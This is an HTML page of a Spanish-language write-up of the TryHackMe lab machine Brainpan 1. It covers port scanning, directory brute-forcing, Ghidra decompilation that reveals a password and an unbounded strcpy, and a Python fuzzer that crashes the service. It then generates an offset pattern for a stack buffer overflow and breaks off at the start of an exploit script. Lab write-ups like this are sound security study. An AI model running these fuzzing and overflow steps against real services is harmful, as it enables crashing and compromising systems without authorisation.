<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>Writeup TryHackMe Brainpan 1</title>

  <meta name="description" content="Resolución de la máquina Brainpan 1 de la plataforma de TryHackMe">
  <meta name="author" content="GatoGamer1155">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Writeup TryHackMe Brainpan 1">
  <meta name="twitter:description" content="Resolución de la máquina Brainpan 1 de la plataforma de TryHackMe">
  <meta name="twitter:creator" content="GatoGamer1155">  
  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/th/brainpan.png" />

  <meta property="og:site_name" content="GatoGamer1155" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="Writeup TryHackMe Brainpan 1">
  <meta property="og:description" content="Resolución de la máquina Brainpan 1 de la plataforma de TryHackMe">
  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/th/brainpan.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/th/brainpan.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="Writeup TryHackMe Brainpan 1" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/thm" title="GatoGamer1155" class="blog-button">TryHackMe</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">
              
              <li class="navigation__item grow">
                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#enumeration">Enumeración</a></li>
        <li><a href="#bof">Local Buffer Overflow</a></li>
        <li><a href="#shellcode">Shellcode Analisis</a></li>
        <li><a href="#shell-puck">Shell - puck</a></li>
        <li><a href="#shell-anansi">Shell - anansi</a></li>
        <li><a href="#shell-root">Shell - root</a></li>
      </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">TryHackMe</h2>
    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/th/brainpan.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
    <h2 class="post-title">Brainpan 1</h2><br>
  </header>

<section class="post" id="enumeration">
<br><h3 class="post-title">Enumeración</h3><br>

<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code>, aunque realmente solo encontramos 2 puertos abiertos, el <code class="language-plaintext highlighter-rouge">9999</code> y el <code class="language-plaintext highlighter-rouge">10000</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ nmap </span><span class="p">10.10.27.47
Nmap scan report for 10.10.27.47
PORT      STATE    SERVICE
9999/tcp  open     abyss
10000/tcp open     snet-sensor-mgmt  </span>
</code></pre></div></div><br>

<p class="plain-text">Al conectarnos con al puerto <code class="language-plaintext highlighter-rouge">9999</code> vemos programa que nos pide una <code class="language-plaintext highlighter-rouge">contraseña</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ netcat </span><span class="p">10.10.27.47 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]  
                          ENTER THE PASSWORD                              

                          >></span>
</code></pre></div></div><br>

<p class="plain-text">Si enviamos una contraseña incorrecta nos devuelve <code class="language-plaintext highlighter-rouge">ACCESS DENIED</code> y termina</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">[________________________ WELCOME TO BRAINPAN _________________________]  
                          ENTER THE PASSWORD                            

                          >> 1234
                          ACCESS DENIED</span>
</code></pre></div></div><br>

<p class="plain-text">El puerto <code class="language-plaintext highlighter-rouge">10000</code> corre un servicio <code class="language-plaintext highlighter-rouge">http</code>, que en el index tiene solo una imagen que nos habla de vulnerabilidades comunes y tal, pero no nos aporta demasiado</p>
<a href="/thm/brainpan/1.png" target="_blank"><div><p><img src="/thm/brainpan/1.png"></p></div></a>

<p class="plain-text">Podemos usar <code class="language-plaintext highlighter-rouge">wfuzz</code> para aplicar fuerza bruta y encontramos un directorio <code class="language-plaintext highlighter-rouge">/bin</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ wfuzz </span><span class="p">-c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.27.47:10000/FUZZ -t 100 --hc 404  
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.27.47:10000/FUZZ
Total requests: 4713

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000854:   </span><span class="az">301</span><span class="p">        0 L      0 W        0 Ch        "bin"</span>
</code></pre></div></div><br>

<p class="plain-text">Si lo miramos desde el navegador podemos ver que tenemos capacidad de listar recursos, este directorio nos comparte un archivo llamado <code class="language-plaintext highlighter-rouge">brainpan.exe</code></p>
<a href="/thm/brainpan/2.png" target="_blank"><div><p><img src="/thm/brainpan/2.png"></p></div></a>

<p class="plain-text">Como es un archivo <code class="language-plaintext highlighter-rouge">exe</code> podemos pasarlo a una máquina <code class="language-plaintext highlighter-rouge">windows</code> y ejecutarlo, al hacerlo solo nos dice que se pone en espera de conexiones por el puerto <code class="language-plaintext highlighter-rouge">9999</code> </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Users\pc1\Desktop> </span><span class="am">.\brainpan.exe  </span><span class="p">
[+] initializing winsock...done.
[+] server socket created.
[+] bind done on port 9999
[+] waiting for connections.</span>
</code></pre></div></div><br>

<p class="plain-text">Nos podemos conectar con <code class="language-plaintext highlighter-rouge">netcat</code> al puerto <code class="language-plaintext highlighter-rouge">9999</code> esta vez usando como direccion la ip de nuestra maquina <code class="language-plaintext highlighter-rouge">windows</code> y vemos la misma aplicación de antes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ netcat </span><span class="p">192.168.100.5 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]  
                          ENTER THE PASSWORD                              

                          >></span>
</code></pre></div></div><br>

<p class="plain-text">Ya que esta corriendo en la máquina victima analizemos el ejecutable con <code class="language-plaintext highlighter-rouge">ghidra</code>, donde vemos la función <code class="language-plaintext highlighter-rouge">_main</code> y haciendo clic en ella vemos su código <code class="language-plaintext highlighter-rouge">c</code></p>
<a href="/thm/brainpan/3.png" target="_blank"><div><p><img src="/thm/brainpan/3.png"></p></div></a>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">/* WARNING: Removing unreachable block (ram,0x311716c5) */

</span><span class="no">int</span><span class="p"> __cdecl </span><span class="na">_main</span><span class="p">(</span><span class="no">int</span><span class="am"> _Argc</span><span class="p">,</span><span class="no">char </span><span class="o">**</span><span class="am">_Argv</span><span class="p">,</span><span class="no">char </span><span class="o">**</span><span class="am">_Env</span><span class="p">)

{
  </span><span class="no">int </span><span class="p">iVar1;
  </span><span class="na">size_t </span><span class="p">sVar2;
  </span><span class="na">size_t </span><span class="p">in_stack_fffff9f0;
  sockaddr local_5dc;
  sockaddr local_5cc;
  SOCKET local_5b4;
  SOCKET local_5b0;
  WSADATA local_5ac;
  undefined4 local_414;
  undefined4 local_410;
  </span><span class="no">int </span><span class="p">local_40c;
  </span><span class="no">char </span><span class="o">*</span><span class="p">local_408;
  </span><span class="no">char </span><span class="o">*</span><span class="p">local_404;
  </span><span class="no">char </span><span class="o">*</span><span class="p">local_400;
  </span><span class="no">char </span><span class="p">local_3fc [</span><span class="mi">1016</span><span class="p">];
  
  __alloca(in_stack_fffff9f0);
  ___main();
  local_400 </span><span class="o">=</span><span class="s"> "_|                            _|                                        </span><span class="mi">\n</span><span class="s">_|_|_|    _|  _|_|    _ |_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><span class="mi">\n</span><span class="s">_|    _|  _|_|      _|    _|  _|  _|    _|  _|     _|  _|    _|  _|    _|</span><span class="mi">\n</span><span class="s">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _ |</span><span class="mi">\n</span><span class="s">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><span class="mi">\n</span><span class="s">                                             _|                          </span><span class="mi">\n</span><span class="s">                                            _ |</span><span class="mi">\n\n</span><span class="s">[________________________ WELCOME TO BRAINPAN _________________________]</span><span class="mi">\n</span><span class="s">                           ENTER THE PASSWORD                              </span><span class="mi">\n\n</span><span class="s">                          >> "</span><span class="p">;  
  local_404 </span><span class="o">=</span><span class="s"> "                          ACCESS DENIED</span><span class="mi">\n</span><span class="s">"</span><span class="p">;
  local_408 </span><span class="o">=</span><span class="s"> "                          ACCESS GRANTED</span><span class="mi">\n</span><span class="s">"</span><span class="p">;
  local_410 </span><span class="o">= </span><span class="mi">9999</span><span class="p">;
  local_414 </span><span class="o">= </span><span class="mi">1</span><span class="p">;
  _printf(</span><span class="s">"[+] initializing winsock..."</span><span class="p">);
  iVar1 </span><span class="o">=</span><span class="p"> _WSAStartup@</span><span class="mi">8</span><span class="p">(</span><span class="mi">0x202</span><span class="p">,</span><span class="o">&</span><span class="p">local_5ac);
  </span><span class="o">if</span><span class="p"> (iVar1 </span><span class="o">== </span><span class="mi">0</span><span class="p">) {
    _printf(</span><span class="s">"done.</span><span class="mi">\n</span><span class="s">"</span><span class="p">);
    iVar1 </span><span class="o">= </span><span class="mi">1</span><span class="p">;
    local_5b0 </span><span class="o">=</span><span class="p"> _socket@</span><span class="mi">12</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);
    </span><span class="o">if</span><span class="p"> (local_5b0 </span><span class="o">== </span><span class="mi">0xffffffff</span><span class="p">) {
      iVar1 </span><span class="o">= </span><span class="p">_WSAGetLastError@</span><span class="mi">0</span><span class="p">();
      _printf(</span><span class="s">"[!] could not create socket: </span><span class="mi">%d</span><span class="p">",iVar1);
    }
    _printf(</span><span class="s">"[+] server socket created.</span><span class="mi">\n</span><span class="s">"</span><span class="p">,iVar1);
    local_5cc.sa_family </span><span class="o">= </span><span class="mi">2</span><span class="p">;
    local_5cc.sa_data._2_4_ </span><span class="o">= </span><span class="mi">0</span><span class="p">;
    local_5cc.sa_data._0_2_ </span><span class="o">= </span><span class="p">_htons@</span><span class="mi">4</span><span class="p">(</span><span class="mi">9999</span><span class="p">);
    iVar1 </span><span class="o">=</span><span class="p"> _bind@</span><span class="mi">12</span><span class="p">(local_5b0,</span><span class="o">&</span><span class="p">local_5cc,</span><span class="mi">0x10</span><span class="p">);
    </span><span class="o">if</span><span class="p"> (iVar1</span><span class="o"> == -</span><span class="mi">1</span><span class="p">) {
      iVar1 </span><span class="o">=</span><span class="p"> _WSAGetLastError@</span><span class="mi">0</span><span class="p">();
      _printf(</span><span class="s">"[!] bind failed: </span><span class="mi">%d</span><span class="s">"</span><span class="p">,iVar1);
    }
    _printf(</span><span class="s">"[+] bind done on port </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">,local_410);
    _listen@</span><span class="mi">8</span><span class="p">(local_5b0,</span><span class="mi">3</span><span class="p">);
    _printf(</span><span class="s">"[+] waiting for connections.</span><span class="mi">\n</span><span class="s">"</span><span class="p">);
    local_40c </span><span class="o">= </span><span class="mi">0x10</span><span class="p">;
    </span><span class="o">while</span><span class="p"> (local_5b4 </span><span class="o">=</span><span class="p"> _accept@</span><span class="mi">12</span><span class="p">(local_5b0,</span><span class="o">&</span><span class="p">local_5dc,</span><span class="o">&</span><span class="p">local_40c), local_5b4 </span><span class="o">!= </span><span class="mi">0xffffffff</span><span class="p">) {
      _printf(</span><span class="s">"[+] received connection.</span><span class="mi">\n</span><span class="s">"</span><span class="p">);
      _memset(local_3fc,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1000</span><span class="p">);
      sVar2 </span><span class="o">= </span><span class="p">_strlen(local_400);
      _send@</span><span class="mi">16</span><span class="p">(local_5b4,local_400,sVar2,</span><span class="mi">0</span><span class="p">);
      _recv@</span><span class="mi">16</span><span class="p">(local_5b4,local_3fc,</span><span class="mi">1000</span><span class="p">,</span><span class="mi">0</span><span class="p">);
      local_414 </span><span class="o">=</span><span class="p"> _get_reply(local_3fc);
      _printf(</span><span class="s">"[+] check is </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">,local_414);
      iVar1 </span><span class="o">=</span><span class="p"> _get_reply(local_3fc);
      </span><span class="o">if</span><span class="p"> (iVar1 </span><span class="o">== </span><span class="mi">0</span><span class="p">) {
        sVar2 </span><span class="o">=</span><span class="p"> _strlen(local_404);
        _send@</span><span class="mi">16</span><span class="p">(local_5b4,local_408,sVar2,</span><span class="mi">0</span><span class="p">);
      }
      </span><span class="o">else</span><span class="p"> {
        sVar2 </span><span class="o">=</span><span class="p"> _strlen(local_408);
        _send@</span><span class="mi">16</span><span class="p">(local_5b4,local_404,sVar2,</span><span class="mi">0</span><span class="p">);
      }
      _closesocket@</span><span class="mi">4</span><span class="p">(local_5b4);
    }
    iVar1 </span><span class="o">=</span><span class="p"> _WSAGetLastError@</span><span class="mi">0</span><span class="p">();
    _printf(</span><span class="s">"[!] accept failed: </span><span class="mi">%d</span><span class="s">"</span><span class="p">,iVar1);
  }
  </span><span class="o">else</span><span class="p"> {
    iVar1 </span><span class="o">=</span><span class="p"> _WSAGetLastError@</span><span class="mi">0</span><span class="p">();
    _printf(</span><span class="s">"[!] winsock init failed: </span><span class="mi">%d</span><span class="s">"</span><span class="p">,iVar1);
  }
  </span><span class="o">return </span><span class="mi">1</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">_main</code> hace un par de validaciones, inicializa el <code class="language-plaintext highlighter-rouge">socket</code> y lo mas destacable es que llama a la función <code class="language-plaintext highlighter-rouge">_get_reply</code> pasandole el input del usuario</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">local_414 </span><span class="o">=</span><span class="p"> _get_reply(local_3fc);  </span>
</code></pre></div></div><br>

<p class="plain-text">Podemos ver la función en <code class="language-plaintext highlighter-rouge">ghidra</code> de la misma manera que antes, es algo pequeña</p>
<a href="/thm/brainpan/4.png" target="_blank"><div><p><img src="/thm/brainpan/4.png"></p></div></a>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">void </span><span class="p">__cdecl </span><span class="na">_get_reply</span><span class="p">(</span><span class="no">char </span><span class="o">*</span><span class="am">param_1</span><span class="p">)

{
  </span><span class="na">size_t</span><span class="p"> sVar1;
  </span><span class="no">char </span><span class="p">local_20c [</span><span class="mi">520</span><span class="p">];

  _printf(</span><span class="s">"[get_reply] s = [</span><span class="mi">%s</span><span class="s">]</span><span class="mi">\n</span><span class="s">"</span><span class="p">,param_1);
  _strcpy(local_20c,param_1);
  sVar1 </span><span class="o">=</span><span class="p"> _strlen(local_20c);
  _printf(</span><span class="s">"[get_reply] copied </span><span class="mi">%d </span><span class="s">bytes to buffer</span><span class="mi">\n</span><span class="s">"</span><span class="p">,sVar1);  
  _strcmp(local_20c,</span><span class="s">"shitstorm</span><span class="mi">\n</span><span class="s">"</span><span class="p">);
  return;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Esta función esta usando la función <code class="language-plaintext highlighter-rouge">strcmp</code> para comparar nuestro input ingresado con la cadena <code class="language-plaintext highlighter-rouge">shitstorm</code>, asi que parece que tenemos la <code class="language-plaintext highlighter-rouge">contraseña</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">strcmp</span><span class="p">(local_20c,</span><span class="s">"shitstorm</span><span class="mi">\n</span><span class="s">"</span><span class="p">);  </span>
</code></pre></div></div><br>

<p class="plain-text">Nos conectamos al puerto <code class="language-plaintext highlighter-rouge">9999</code> y enviamos la cadena <code class="language-plaintext highlighter-rouge">shitstorm</code> que encontramos, sin embargo aunque nos devuelve <code class="language-plaintext highlighter-rouge">ACCESS GRANTED</code> el programa termina ahi</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ netcat </span><span class="p">10.10.27.47 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]  
                          ENTER THE PASSWORD                              

                          >> shitstorm
                          ACCESS GRANTED</span>
</code></pre></div></div><br>

<p class="plain-text">El verdadero problema es que esta usando la función <code class="language-plaintext highlighter-rouge">strcpy</code> con un buffer definido que solo es de <code class="language-plaintext highlighter-rouge">520</code> bytes, por lo que puede ser vulnerable a <code class="language-plaintext highlighter-rouge">Buffer Overflow</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">char </span><span class="p">local_20c [</span><span class="mi">520</span><span class="p">];

</span><span class="no">strcpy</span><span class="p">(local_20c,param_1);  </span>
</code></pre></div></div><br>

</section>

<section class="post" id="bof">
<br><h3 class="post-title">Local Buffer Overflow</h3><br>

<p class="plain-text">Ejecutamos el <code class="language-plaintext highlighter-rouge">exe</code> y empezaremos un script en <code class="language-plaintext highlighter-rouge">python</code> importando algunas librerias, ademas de definir un <code class="language-plaintext highlighter-rouge">array</code>, un <code class="language-plaintext highlighter-rouge">contador</code>, y después una barra <code class="language-plaintext highlighter-rouge">log</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">log
</span><span class="o">import </span><span class="p">socket, time

buffer </span><span class="o">=</span><span class="p"> [</span><span class="no">b</span><span class="s">"A"</span><span class="p">]
counter </span><span class="o">= </span><span class="mi">100</span><span class="p">

bar </span><span class="o">= </span><span class="p">log.progress(</span><span class="s">""</span><span class="p">)  </span>
</code></pre></div></div><br>

<p class="plain-text">Ahora un total de <code class="language-plaintext highlighter-rouge">32</code> veces agregaremos un valor del <code class="language-plaintext highlighter-rouge">array</code> que sera <code class="language-plaintext highlighter-rouge">A</code> multiplicado por el contador mas <code class="language-plaintext highlighter-rouge">100</code> en cada iteración, y aumentaremos el contador</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">while </span><span class="no">len</span><span class="p">(buffer) </span><span class="o">< </span><span class="mi">32</span><span class="p">:
    buffer.append(</span><span class="no">b</span><span class="s">"A" </span><span class="o">*</span><span class="p"> counter)  
    counter </span><span class="o">+= </span><span class="mi">100</span>
</code></pre></div></div><br>

<p class="plain-text">Despues iteramos sobre cada valor del <code class="language-plaintext highlighter-rouge">array</code> definimos una conexión y enviamos el valor seguido de <code class="language-plaintext highlighter-rouge">\r\n</code> para simular un <code class="language-plaintext highlighter-rouge">enter</code>, por cada iteración mostraremos la cantidad de <code class="language-plaintext highlighter-rouge">bytes</code> enviados en la <code class="language-plaintext highlighter-rouge">barra</code> log y esperamos <code class="language-plaintext highlighter-rouge">1</code> segundo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">for </span><span class="p">strings </span><span class="o">in </span><span class="p">buffer:
    </span><span class="o">try</span><span class="p">:
        time.sleep(</span><span class="mi">1</span><span class="p">)
        bar.status(</span><span class="no">f</span><span class="s">"Enviando: </span><span class="p">{</span><span class="no">len</span><span class="p">(strings)}</span><span class="s"> bytes"</span><span class="p">)

        shell </span><span class="o">= </span><span class="p">socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        shell.connect((</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">9999</span><span class="p">))
        shell.recv(</span><span class="mi">1024</span><span class="p">)

        shell.send(strings </span><span class="o">+ </span><span class="no">b</span><span class="s">"</span><span class="mi">\r\n</span><span class="s">"</span><span class="p">)

        shell.recv(</span><span class="mi">1024</span><span class="p">)
        shell.close()

    </span><span class="o">except</span><span class="p">:
        bar.success(</span><span class="no">f</span><span class="s">"El programa se detuvo al enviar: </span><span class="p">{</span><span class="no">len</span><span class="p">(strings)}</span><span class="s"> bytes"</span><span class="p">)  
        exit(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div><br>


<p class="plain-text">Nuestro script final para <code class="language-plaintext highlighter-rouge">fuzzear</code> seria el siguiente y al ejecutarlo este logra enviar un total de <code class="language-plaintext highlighter-rouge">600</code> bytes antes de que el programa se corrompa y deje de responder</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">log
</span><span class="o">import </span><span class="p">socket, time

buffer </span><span class="o">=</span><span class="p"> [</span><span class="no">b</span><span class="s">"A"</span><span class="p">]
counter </span><span class="o">= </span><span class="mi">100</span><span class="p">

bar </span><span class="o">= </span><span class="p">log.progress(</span><span class="s">""</span><span class="p">)

</span><span class="o">while </span><span class="no">len</span><span class="p">(buffer) </span><span class="o">< </span><span class="mi">32</span><span class="p">:
    buffer.append(</span><span class="no">b</span><span class="s">"A" </span><span class="o">*</span><span class="p"> counter)  
    counter </span><span class="o">+= </span><span class="mi">100

</span><span class="o">for </span><span class="p">strings </span><span class="o">in </span><span class="p">buffer:
    </span><span class="o">try</span><span class="p">:
        time.sleep(</span><span class="mi">1</span><span class="p">)
        bar.status(</span><span class="no">f</span><span class="s">"Enviando: </span><span class="p">{</span><span class="no">len</span><span class="p">(strings)}</span><span class="s"> bytes"</span><span class="p">)

        shell </span><span class="o">= </span><span class="p">socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        shell.connect((</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">9999</span><span class="p">))
        shell.recv(</span><span class="mi">1024</span><span class="p">)

        shell.send(strings </span><span class="o">+ </span><span class="no">b</span><span class="s">"</span><span class="mi">\r\n</span><span class="s">"</span><span class="p">)

        shell.recv(</span><span class="mi">1024</span><span class="p">)
        shell.close()

    </span><span class="o">except</span><span class="p">:
        bar.success(</span><span class="no">f</span><span class="s">"El programa se detuvo al enviar: </span><span class="p">{</span><span class="no">len</span><span class="p">(strings)}</span><span class="s"> bytes"</span><span class="p">)  
        exit(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] El programa se detuvo al enviar: 600 bytes  </span>
</code></pre></div></div><br>

<p class="plain-text">Para trabajar con los registros usaremos <a href="https://www.immunityinc.com/products/debugger/">Immunity Debugger</a> junto con el modulo <a href="https://github.com/corelan/mona">mona</a>, asi que abrimos el <code class="language-plaintext highlighter-rouge">brainpan.exe</code> en el programa y lo corremos</p>
<a href="/thm/brainpan/5.png" target="_blank"><div><p><img src="/thm/brainpan/5.png"></p></div></a>

<p class="plain-text">Necesitamos encontrar la cantidad de <code class="language-plaintext highlighter-rouge">bytes</code> necesarios antes de llegar a <code class="language-plaintext highlighter-rouge">EIP</code> creamos una cadena especial de <code class="language-plaintext highlighter-rouge">600</code> caracteres con <code class="language-plaintext highlighter-rouge">msf-pattern_create</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msf-pattern_create</span><span class="p"> -l 600
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9  </span>
</code></pre></div></div><br>

<p class="plain-text">Esta vez como alternativa a <code class="language-plaintext highlighter-rouge">socket</code> podemos usar <code class="language-plaintext highlighter-rouge">remote</code> del modulo pwn, creamos una conexión y enviamos el patron generado antes con msf-pattern_create</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

